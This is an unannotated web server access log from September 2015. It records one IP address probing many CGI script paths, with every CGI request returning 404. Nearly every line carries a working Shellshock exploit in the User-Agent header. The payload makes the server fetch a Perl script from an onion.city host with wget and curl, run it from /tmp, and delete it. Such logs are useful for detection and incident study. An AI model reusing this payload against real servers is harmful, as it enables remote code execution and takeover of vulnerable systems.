72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/index2.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/test-cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/supply.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/status.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/forum.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/test HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/contact.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/uptime.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/php4 HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-sys/php5 HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/env.pl HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/info/perlinfo.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET  HTTP/1.1" 400 181 "-" "-"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/debug.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
72.94.52.5 - - [11/Sep/2015:13:30:07 -0400] "GET /cgi-bin/reboot.cgi HTTP/1.1" 404 14 "-" "() { :;};/usr/bin/perl -e 'print \x22Content-Type: text/plain\x5Cr\x5Cn\x5Cr\x5CnXSUCCESS!\x22;system(\x22wget http://cthy6msf2fqzv7dh.onion.city/perlme -O /tmp/t3.log;curl -O /tmp/t3.log http://cthy6msf2fqzv7dh.onion.city/perlme;perl /tmp/t3.log;rm -rf /tmp/t3.log*\x22);'"
